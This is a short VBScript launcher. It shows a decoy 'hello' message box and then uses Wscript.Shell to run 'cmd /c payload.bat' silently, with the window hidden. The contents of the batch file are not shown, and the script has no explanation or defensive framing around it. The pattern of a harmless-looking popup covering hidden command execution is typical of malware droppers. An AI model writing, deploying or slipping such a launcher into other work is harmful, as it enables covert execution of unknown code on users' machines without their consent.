X=MsgBox ("hello",48, " ")
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c payload.bat"
oShell.Run strArgs, 0, false
